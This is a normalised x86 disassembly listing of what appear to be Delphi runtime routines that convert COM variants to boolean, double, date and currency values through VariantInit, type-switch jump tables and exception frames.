jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_40e680
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4102e8
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_4100d0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_4100d0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_41058b ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402960
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402960
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402960
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402960
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41017c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410334
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_410778
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41082f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_4128f8
lea eax [ ebp - 0xa ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4041a8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x1 ]
call sub_4082f0
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410836
lea eax [ ebp - 0x10 ]
call sub_403f20
lea eax [ ebp - 0x8 ]
call sub_404600
retn
mov dx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_40eb14
jmp r-xdata
mov dx [ ebx ]
mov cx 0xb
call sub_40eb14
cmp [ ebp - 0xa ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
jmp r-xdata
sub_410840
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0xb
call sub_40eb14
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_410880
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4108d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_40f1e0
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_410930
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4108db
lea eax [ ebp - 0x11 ]
call sub_40eeb8
retn
sub_4108e4
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4143cc
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_410930
push ebx
push ecx
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41094a ]
mov eax ebx
call sub_410778
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410778
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410930
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_410840
mov [ esp ] al
jmp r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_410880
mov [ esp ] al
jmp r-xdata
jmp r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_40e680
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4108e4
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410840
mov [ esp ] al
mov eax ebx
call sub_410840
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_410b0c ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410778
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_410930
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_410c84
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410d39
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_4128f8
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4041a8
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_4094f8
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40eb14
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40eb14
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410d40
lea eax [ ebp - 0x1c ]
call sub_403f20
lea eax [ ebp - 0xc ]
call sub_404600
retn
sub_410d48
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40eb14
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_410d94
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410de9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f1e0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_410e44
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410df0
lea eax [ ebp - 0x18 ]
call sub_40eeb8
retn
sub_410df8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4143cc
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_410e44
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410e60 ]
mov eax ebx
call sub_410c84
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_410c84
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_410e44
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_410d48
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_410d94
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40e680
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_410df8
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410d48
fstp [ esp ]
fwait
mov eax ebx
call sub_410d48
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41103d ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_410c84
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_410e44
fstp [ esp ]
fwait
jmp r-xdata
sub_4111dc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_411341
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410e44
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_4111fe ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40e680
sub_41136c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411448
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_4128f8
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4041a8
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40af34
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41144f
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403f44
lea eax [ ebp - 0xc ]
call sub_404600
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_4041a8
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_409514
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40eb14
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40eb14
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_411458
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40eb14
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4114b8
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40eb14
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_411504
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411559
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f1e0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4115b4
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411560
lea eax [ ebp - 0x18 ]
call sub_40eeb8
retn
sub_411568
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4143cc
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4115b4
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4115d0 ]
mov eax ebx
call sub_41136c
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4114b8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_41136c
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411458
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4115b4
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4114b8
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411504
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40e680
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411568
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_4114b8
fstp [ esp ]
fwait
mov eax ebx
call sub_4114b8
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_41179b ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4114b8
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_41136c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411458
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4115b4
fstp [ esp ]
fwait
jmp r-xdata
sub_411904
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4119b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_4128f8
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4041a8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_40956c
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4119b7
lea eax [ ebp - 0x10 ]
call sub_403f20
lea eax [ ebp - 0xc ]
call sub_404600
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
